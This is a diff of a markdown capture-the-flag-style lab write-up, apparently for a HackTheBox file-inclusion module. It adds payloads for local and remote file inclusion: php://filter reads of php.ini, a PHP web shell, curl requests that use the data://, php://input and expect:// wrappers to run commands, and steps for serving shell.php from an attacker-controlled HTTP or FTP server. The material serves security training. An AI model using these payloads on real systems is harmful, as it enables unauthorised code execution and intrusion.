@@ -91,23 +91,64 @@ We'll read the php.ini file to check if `allow_url_include` is enable for us to 
 We'll use the below payload to read the `php.ini` file:
 
 ```
-php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini"
+php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/apache2/php.ini
 ```
 
 For `Nginx`:
 
 ```
-php://filter/read=convert.base64-encode/resource=../../../..//etc/php/X.Y/fpm/php.ini"
+php://filter/read=convert.base64-encode/resource=../../../..//etc/php/X.Y/fpm/php.ini
 ```
 
 Different php wrappers to use:
+
+
+- data:// (GET)
 
 ```
 echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
 
-- data:// (GET)
+```
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
+```
+
 ![Data php warpper](/images/htb/file-inclusion/php-wrappers-data.png)
 - php://input (POST)
+
+```
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+```
+
 ![Input php warpper](/images/htb/file-inclusion/php-wrappers-input.png)
 - expect:// (GET)
+
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+## Remote File Inclusion (RFI)
+
+> Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
+
+### HTTP
+
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+```
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+![RFI HTTP Result](/images/htb/file-inclusion/rfi-http-result.png)
+
+### FTP
+
+```
+sudo python -m pyftpdlib -p 21
+```
